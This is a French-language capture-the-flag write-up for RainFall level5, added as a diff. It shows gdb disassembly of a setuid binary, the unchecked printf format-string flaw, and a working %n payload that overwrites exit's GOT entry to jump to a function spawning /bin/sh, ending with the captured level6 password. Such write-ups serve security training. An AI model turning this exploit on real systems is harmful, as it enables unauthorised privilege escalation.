@@ -1,0 +1,78 @@
+-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5*
+
+level5@RainFall:~$ ./level5 
+asdsad
+asdsad
+
+prend un input et l'affiche
+
+(gdb) info functions 
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+
+(gdb) info variables 
+0x08049854  m
+
+(gdb) disas main
+0x08048504 <+0>:     push   %ebp
+0x08048505 <+1>:     mov    %esp,%ebp
+0x08048507 <+3>:     and    $0xfffffff0,%esp
+0x0804850a <+6>:     call   0x80484c2 <n>
+0x0804850f <+11>:    leave  
+0x08048510 <+12>:    ret   
+
+(gdb) disas n
+0x080484c2 <+0>:     push   %ebp
+0x080484c3 <+1>:     mov    %esp,%ebp
+0x080484c5 <+3>:     sub    $0x218,%esp				-> StackFrame de 536
+0x080484cb <+9>:     mov    0x8049848,%eax			-> stdin
+0x080484d0 <+14>:    mov    %eax,0x8(%esp)			-> stdin à esp+8	=> arg fgets
+0x080484d4 <+18>:    movl   $0x200,0x4(%esp)		-> 512 à esp+4		=> arg fgets
+0x080484dc <+26>:    lea    -0x208(%ebp),%eax		-> buf[520] à eax	=> arg fgets
+0x080484e2 <+32>:    mov    %eax,(%esp)				-> top de pile
+0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>	-> recup l'input fgets(buf, 512, stdin)
+0x080484ea <+40>:    lea    -0x208(%ebp),%eax		-> recup le ptr du buf dans eax
+0x080484f0 <+46>:    mov    %eax,(%esp)				-> top de pile
+0x080484f3 <+49>:    call   0x8048380 <printf@plt>	-> Appel Printf avec l'input sans arg => faille !!!
+0x080484f8 <+54>:    movl   $0x1,(%esp)
+0x080484ff <+61>:    call   0x80483d0 <exit@plt>	-> Arret du bin
+
+(gdb) disas o
+0x080484a4 <+0>:     push   %ebp
+0x080484a5 <+1>:     mov    %esp,%ebp
+0x080484a7 <+3>:     sub    $0x18,%esp				-> StackFrame de 24
+0x080484aa <+6>:     movl   $0x80485f0,(%esp)		-> "/bin/sh"
+0x080484b1 <+13>:    call   0x80483b0 <system@plt>	-> execv("/bin/sh")
+0x080484b6 <+18>:    movl   $0x1,(%esp)
+0x080484bd <+25>:    call   0x8048390 <_exit@plt>
+
+Encore le même principe que les levels précédent, exploité printf %n
+La var globale m n'est pas utilisé
+
+Objectif: Controler eip de n
+Forcer printf à faire un jump vers la fonction o qui donne un accès au shell avec des droits supérieurs
+
+AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
+AAAA-200-b7fd1ac0-b7ff37d0-41414141-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-a78252d-0
+
+Position 4 => %4$n
+
+!!! Pas eip mais exit !!!
+
+0x080484ff <+61>:    call   0x80483d0 <exit@plt>
+(gdb) x/i 0x80483d0
+   0x80483d0 <exit@plt>:        jmp    *0x8049838
+
+exit:	0x8049838 -> \x38\x98\x04\x08
+
+Difference importante => avant on écrivait une valeur deci, maintenant il faut écrire une addr
+
+addr o:	0x080484a4 -> \xA4\x84\x04\x08 -> 134 513 828 - 4 bytes
+
+python -c 'print "\x38\x98\x04\x08"+"%134513824d"+"%4$n"' > /tmp/sad
+
+whoami
+level6
+cat /home/user/level6/.pass    
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
